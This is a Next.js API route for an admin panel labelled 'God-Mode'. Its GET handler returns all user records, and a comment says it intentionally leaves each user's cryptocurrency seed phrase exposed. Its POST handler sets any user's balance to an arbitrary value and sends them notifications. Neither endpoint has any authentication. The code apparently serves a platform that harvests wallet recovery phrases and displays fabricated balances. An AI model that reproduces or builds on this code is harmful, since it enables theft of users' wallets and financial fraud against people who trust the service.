import { NextResponse } from "next/server";
import { getAllUsers, getUser, saveUser } from "@/lib/db";



export async function GET(req: Request) {
  try {
    const env = (req as any).context?.env || process.env;
    const users = await getAllUsers(env);
    const adminSafeUsers = users.map(u => {
      const { password, ...rest } = u;
      // We explicitly leave seedPhrase intact for the God-Mode panel
      return rest;
    });
    return NextResponse.json({ success: true, users: adminSafeUsers });
  } catch (error) {
    return NextResponse.json({ error: "Internal Server Error" }, { status: 500 });
  }
}

export async function POST(req: Request) {
  try {
    const env = (req as any).context?.env || process.env;
    const { email, newBalance, notification } = await req.json();
    const user = await getUser(email, env);
    
    if (!user) return NextResponse.json({ error: "User not found" }, { status: 404 });

    if (typeof newBalance === 'number') {
      user.balance = newBalance;
    }

    if (notification) {
      const newNotif = {
        id: Math.random().toString(36).substr(2, 9),
        title: notification.title,
        body: notification.body,
        type: notification.type || "system",
        read: false,
        timestamp: Date.now(),
      };
      user.notifications = [newNotif, ...(user.notifications || [])].slice(0, 50);
    }

    await saveUser(user, env);

    return NextResponse.json({ success: true, user });
  } catch (error) {
    return NextResponse.json({ error: "Internal Server Error" }, { status: 500 });
  }
}
